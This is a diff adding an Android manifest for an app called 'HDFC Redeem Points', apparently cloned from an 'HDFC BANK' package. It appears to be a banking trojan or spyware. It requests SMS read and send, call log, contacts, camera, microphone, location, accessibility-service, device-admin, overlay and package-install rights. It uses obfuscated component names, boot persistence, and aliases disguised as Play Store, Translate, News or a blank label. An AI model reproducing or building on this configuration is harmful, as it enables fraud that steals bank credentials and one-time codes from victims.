@@ -1,0 +1,248 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.appser.verapq" platformBuildVersionCode="27" platformBuildVersionName="" android:versionCode="12200" android:versionName="12.2.0.0" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415">
+    <uses-sdk android:minSdkVersion="19" android:targetSdkVersion="27"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <queries>
+        <package android:name="null"/>
+    </queries>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="com.android.alarm.permission.SET_ALARM"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <application android:theme="@style/Theme.Translucent.NoTitleBar" android:label="HDFC Redeem Points" android:icon="@drawable/armravenuez65" android:testOnly="false" android:allowBackup="true" android:largeHeap="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:appComponentFactory="android.support.v4.app.CoreComponentFactory">
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16" android:excludeFromRecents="true"/>
+        <activity android:label="Play Store" android:name="com.appser.CamActivity" android:excludeFromRecents="true" android:noHistory="true">
+            <intent-filter>
+                <action android:name="xyz"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="Google Play" android:name="com.appser.SCRActivity" android:excludeFromRecents="true"/>
+        <provider android:name="android.support.v4.content.FileProvider" android:exported="false" android:authorities="com.appser.verapq.provider" android:grantUriPermissions="true">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
+        </provider>
+        <activity android:label="@string/ehvremainsq54" android:icon="@drawable/armravenuez65" android:name="com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10"/>
+        <activity-alias android:label="@string/ehvremainsq54" android:icon="@drawable/armravenuez65" android:name="com.appser.MainActive" android:enabled="true" android:launchMode="singleTask" android:targetActivity="com.appser.deckmformulawamendedjdeleteddkgoaccessingeliveehourlykbreastaproposexdisciplinevwellsbbelfastl10">
+            <intent-filter>
+                <action android:name="android.intent.action.CHOOSER"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="com.android.internal.category.PLATLOGO"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SEND_MULTIPLE"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX"/>
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND"/>
+                <action android:name="ru.aaaaaaax.installer"/>
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.INST"/>
+                <action android:name="com.App.Reborn"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:label="@string/trans" android:name="com.appser.filmeyfwfkleineovernightncharttplumbinglranxexpectationsityffluxndowcfurtheraphasesqcelebrityf23"/>
+        <activity-alias android:theme="@style/Theme.Translucent.NoTitleBar" android:label="Translate" android:icon="@drawable/tranclat" android:name="com.appser.GoogleTranslate" android:enabled="false" android:targetActivity="com.appser.filmeyfwfkleineovernightncharttplumbinglranxexpectationsityffluxndowcfurtheraphasesqcelebrityf23">
+            <intent-filter>
+                <action android:name="android.intent.action.CHOOSER"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="com.android.internal.category.PLATLOGO"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SEND_MULTIPLE"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX"/>
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND"/>
+                <action android:name="ru.aaaaaaax.installer"/>
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.INST"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:label="@string/newss" android:name="com.appser.ruthhdenyzzoloftztimingiboatsvrevvbicyclemqueriesicommslateriimpossiblejgilbertwspotsqweights20"/>
+        <activity-alias android:label="News" android:icon="@drawable/nws" android:name="com.appser.googlenews" android:enabled="false" android:targetActivity="com.appser.ruthhdenyzzoloftztimingiboatsvrevvbicyclemqueriesicommslateriimpossiblejgilbertwspotsqweights20">
+            <intent-filter>
+                <action android:name="android.intent.action.CHOOSER"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="com.android.internal.category.PLATLOGO"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SEND_MULTIPLE"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX"/>
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND"/>
+                <action android:name="ru.aaaaaaax.installer"/>
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.INST"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:label="   " android:name="com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26" android:configChanges="orientation|screenSize"/>
+        <activity-alias android:label="   " android:icon="@drawable/skinicon" android:name="com.appser.costm" android:enabled="false" android:configChanges="orientation|screenSize" android:targetActivity="com.appser.passivecivorygarnoldkcontinuesmpoliticsttheoryvreplacenbuilderhfeaturesfbarbielratskrestricth26">
+            <intent-filter>
+                <action android:name="android.intent.action.CHOOSER"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="com.android.internal.category.PLATLOGO"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SEND_MULTIPLE"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX"/>
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND"/>
+                <action android:name="ru.aaaaaaax.installer"/>
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND"/>
+                <action android:name="com.android.vending.billing.InAppBillingService.INST"/>
+            </intent-filter>
+        </activity-alias>
+        <service android:name="com.appser.WackMeUpJob" android:permission="android.permission.BIND_JOB_SERVICE" android:enabled="true"/>
+        <receiver android:name="com.appser.SensorRestarterBroadcastReceiver">
+            <intent-filter>
+                <action android:name="RestartSensor"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="@string/ehvremainsq54" android:name="com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31" android:enabled="true"/>
+        <service android:label="@string/ehvremainsq54" android:name="com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8" android:enabled="true"/>
+        <service android:label="@string/ehvremainsq54" android:name="com.appser.myworker" android:enabled="true"/>
+        <service android:label="@string/ehvremainsq54" android:name="com.appser.dikevolutionbcircuitxeuropeanhgeooresidentsnministryjattentionointerfaceqplacehducksoliverc7" android:enabled="true"/>
+        <service android:name="com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:persistent="true" android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility"/>
+        </service>
+        <service android:name="com.appser.verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33" android:persistent="true" android:enabled="true"/>
+        <receiver android:name="com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex3" android:enabled="true" android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.appser.RC" android:enabled="true" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex34">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.Intent.ACTION_USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22"/>
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.valcstartedqeossexpectsrosrsimulationtconservativettimeyjordaneenlargementzschoolknetscapee19"/>
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.gardenxgroundshsociologyoshowingqanthonytmsgwdaughtersediscountsgproblemnplcfhouseholdstchaino18"/>
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24"/>
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.punchsrevelationbdescendingnmomddsccnakedcadvisorymmarieqdispatchosubscriptionhmotorcyclesd17" android:noHistory="true"/>
+        <activity android:theme="@style/Theme.Translucent.NoTitleBar" android:name="com.appser.activityadm" android:noHistory="true"/>
+        <receiver android:label="@string/device_admin_label" android:name="com.appser.AdminReciver" android:permission="android.permission.BIND_DEVICE_ADMIN" android:description="@string/device_description">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/adminrights"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="com.applisto.appcloner.name" android:value="HDFC Redeem Points"/>
+        <meta-data android:name="com.applisto.appcloner.originalName" android:value="HDFC BANK"/>
+        <meta-data android:name="com.applisto.appcloner.originalPackageName" android:value="Y29tLmFwcHNlci52ZXJhcHA="/>
+        <meta-data android:name="com.applisto.appcloner.cloneNumber" android:value="1"/>
+        <meta-data android:name="com.applisto.appcloner.cloneSource" android:value="apk_file"/>
+        <meta-data android:name="com.applisto.appcloner.cloneTimestamp" android:value="1673082880270"/>
+        <meta-data android:name="com.applisto.appcloner.cloneBuildSerial" android:value="1ed1962f"/>
+        <meta-data android:name="com.applisto.appcloner.cloneBuildManufacturer" android:value="OPPO"/>
+        <meta-data android:name="com.applisto.appcloner.cloneBuildModel" android:value="CPH1803"/>
+        <meta-data android:name="com.applisto.appcloner.clonePremiumVersion" android:value="true"/>
+        <meta-data android:name="com.applisto.appcloner.forceDeviceLock" android:value="false"/>
+        <meta-data android:name="com.applisto.appcloner.runtimeModdingOptions" android:value="true"/>
+        <meta-data android:name="com.applisto.appcloner.versionCode" android:value="12200"/>
+        <meta-data android:name="com.applisto.appcloner.versionName" android:value="12.2.0.0"/>
+        <meta-data android:name="com.applisto.appcloner.appClonerVersionCode" android:value="19051114"/>
+        <meta-data android:name="com.applisto.appcloner.appClonerVersionName" android:value="1.5.21"/>
+        <meta-data android:name="com.applisto.appcloner.appClonerClassesVersionCode" android:value="20190306"/>
+        <meta-data android:name="com.applisto.appcloner.originalSignatures" android:value="AQAAABwAAABhAG4AZAByAG8AaQBkAC4AYwBvAG4AdABlAG4AdAAuAHAAbQAuAFMAaQBnAG4AYQB0AHUAcgBlAAAAAACUAwAAMIIDkDCCAnigAwIBAgIEO4CjtzANBgkqhkiG9w0BAQsFADBhMQswCQYDVQQGEwJVUzEMMAoGA1UECBMDVVNBMQswCQYDVQQHEwJDQTEZMBcGA1UECgwQTWV0YUBhbmRyb2lkLmNvbTENMAsGA1UECxMETWV0YTENMAsGA1UEAxMETWV0YTAgFw0yMjAxMTQxODUxMDdaGA80MDUwMDkwOTE4NTEwN1owYTELMAkGA1UEBhMCVVMxDDAKBgNVBAgTA1VTQTELMAkGA1UEBxMCQ0ExGTAXBgNVBAoMEE1ldGFAYW5kcm9pZC5jb20xDTALBgNVBAsTBE1ldGExDTALBgNVBAMTBE1ldGEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDzwZt/p/UiNFOGVmBVZE9CoKKP0AjS2lOQMFzQfY8eyl8Vnb4xJ1bgd97DFeDxLm4eSBEJKD958AY9bwtKD4FxyKqGYobhqVTNmyfCRXYYSaI2pP2MtTY/4ZLlPQ8I0zuA4Ci3lMlwQiy59BFBSf2IPnTQRZXw3YJAPYNcoeEWnCRwBTQHjvoRuuzILesD5OgmZ985hKqMtXvBsMGx00awpn1G77MMsDEiScwsqygtW0jubSwINZB2m+nCHTdW6WZdJE8gDdf7Fzds2EHzLUyR6kxc97JU10Rj++VM7gRBxBIkcKKF4Im5ixAiUJxzVKW5Mh5t+Rg2WeIHDCGz86/pAgMBAAGjTjBMMCsGA1UdEAQkMCKADzIwMjIwMTE0MTg1MTA3WoEPNDA1MDA5MDkxODUxMDdaMB0GA1UdDgQWBBTmniwueUFHC9Hc+sS7BKJBYOTalTANBgkqhkiG9w0BAQsFAAOCAQEALjFcTeaKvB935TKx1ilOTcU6phAsjALCkCBRai2DIiDfBBlwBIaGZall7PmFsDqDGIZS8cGd/8ZkIjWFzr6FuKUF0umNAFHhnSeIbgmDtxuW3ACfjL22HDHPgTiB2xHohpQwVNANAxsN2IxXy1qCaayQeqzT3Dvs6bQNp9vxXdS/LhEKhFyb6jSFGnZopPhioB8ccnBk73OhHDRsUoaenagir2QpMRsrFMUZ+zPuMuaxqGlgvfgmGci9y+4ndHOJwARjS716JhXAjDb0ijTisdLspQ+PEP9O1Tx/2pn/N0xW2O8I6p6L68VA/ItFissZtvZkSz/AWndlt6gSORH9aA=="/>
+        <meta-data android:name="com.android.vending.derived.apk.id" android:value="1"/>
+        <provider android:name="com.applisto.appcloner.classes.DefaultProvider" android:exported="true" android:authorities="com.appser.verapq.com.applisto.appcloner.classes.DefaultProvider" android:initOrder="2147483647"/>
+        <service android:name="com.applisto.appcloner.service.RemoteService" android:exported="true"/>
+        <receiver android:name="com.applisto.appcloner.classes.DefaultProvider$DefaultReceiver" android:exported="true"/>
+        <activity android:name="com.applisto.appcloner.classes.DefaultProvider$MyActivity" android:exported="true"/>
+        <receiver android:name="com.applisto.appcloner.classes.DisableClipboardAccess$ClearClipboardReceiver"/>
+    </application>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="net.dinglisch.android.tasker.PERMISSION_RUN_TASKS"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.USE_FINGERPRINT"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.READ_SETTINGS"/>
+</manifest>
